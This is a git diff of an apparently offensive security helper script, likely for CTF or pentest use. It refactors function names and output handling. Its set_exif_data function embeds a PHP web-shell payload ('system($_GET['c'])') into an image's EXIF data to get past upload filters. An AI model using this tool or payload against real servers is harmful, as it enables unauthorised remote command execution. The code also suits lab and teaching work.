@@ -16,8 +16,7 @@ def isPortInUse(port):
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
         return s.connect_ex(('127.0.0.1', port)) == 0
 
-
-def getAddress(interface="tun0"):
+def get_address(interface="tun0"):
     if not interface in ni.interfaces():
         interfaces = ni.interfaces()
         interfaces.remove('lo')
@@ -111,7 +110,7 @@ def pad(x, n):
         x  += (n-(len(x)%n))*b"\x00"
     return x
 
-def exifImage(payload="<?php system($_GET['c']);?>", _in=None, _out=None, exif_tag=None):
+def set_exif_data(payload="<?php system($_GET['c']);?>", _in=None, _out=None, exif_tag=None):
 
     if _in is None or (isinstance(_in, str) and not os.path.exists(_in)):
         _in = Image.new("RGB", (50,50), (255,255,255))
@@ -120,7 +119,7 @@ def exifImage(payload="<?php system($_GET['c']);?>", _in=None, _out=None, exif_t
         _in = exif.Image(open(_in, "rb"))
     elif isinstance(_in, Image.Image):
         bytes = io.BytesIO()
-        _in.save(bytes, format='PNG')
+        _in.save(bytes, format='JPEG')
         _in = exif.Image(bytes.getvalue())
     elif not isinstance(_in, exif.Image):
         print("Invalid input. Either give an Image or a path to an image.")
@@ -145,8 +144,7 @@ def exifImage(payload="<?php system($_GET['c']);?>", _in=None, _out=None, exif_t
         _in[exif_tag] = payload
 
     if _out is None:
-        sys.stdout.write(_in.get_file())
-        sys.stdout.flush()
+        return _in.get_file()
     elif isinstance(_out, str):
         with open(_out, "wb") as f:
             f.write(_in.get_file())
@@ -165,9 +163,9 @@ if __name__ == "__main__":
     command = sys.argv[1]
     if command == "getAddress":
         if len(sys.argv) >= 3:
-            print(getAddress(sys.argv[2]))
+            print(get_address(sys.argv[2]))
         else:
-            print(getAddress())
+            print(get_address())
     elif command == "pad":
         if len(sys.argv) >= 3:
             n = 8
@@ -192,7 +190,9 @@ if __name__ == "__main__":
             else:
                 _out = ".".join(_out[0:-1]) + "_exif." + _out[-1]
 
-            exifImage(payload, _in, _out, tag)
+            output = set_exif_data(payload, _in, _out, tag)
+            sys.stdout.buffer.write(output)
+            sys.stdout.flush()
     elif command == "help":
         print("Usage: %s [command]" % bin)
         print("Available commands:")
